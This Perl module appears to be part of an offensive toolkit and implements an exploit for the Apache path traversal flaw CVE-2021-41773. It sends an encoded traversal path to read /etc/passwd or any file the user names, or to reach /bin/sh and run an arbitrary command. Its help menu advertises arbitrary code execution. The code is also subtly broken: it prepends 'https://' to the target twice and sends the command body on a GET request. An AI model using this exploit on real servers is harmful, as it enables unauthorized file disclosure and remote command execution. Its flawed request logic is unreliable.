package Spellbook::Advisory::CVE_2021_41773 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $file, $command);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'      => \$help,
            't|target=s'  => \$target,
            'f|file=s'    => \$file,
            'c|command=s' => \$command
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//msx) { 
                $target = "https://$target";
            }
            
            if (!$file) {
                $file = "/etc/passwd";
            }

            my $payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/";

            if ($command) {
                $payload = $payload . "/bin/sh";
            }

            if (!$command) {
                $payload = $payload . $file;
            }

            my $useragent = Spellbook::Core::UserAgent -> new();
            my $request   = $useragent -> get(
               "https://" . $target . $payload, 
                Content => $command || " "
            );

            if ($request -> code() == 200) {
                return $request -> content();
            }
        }

        if ($help) {
            return "
                \rExploit::CVE_2021_41773
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target
                \r-f, --file     Define a file to read
                \r-c, --command  Arbitrary code execution\n\n";
        }

        return 0;
    }
}

1;
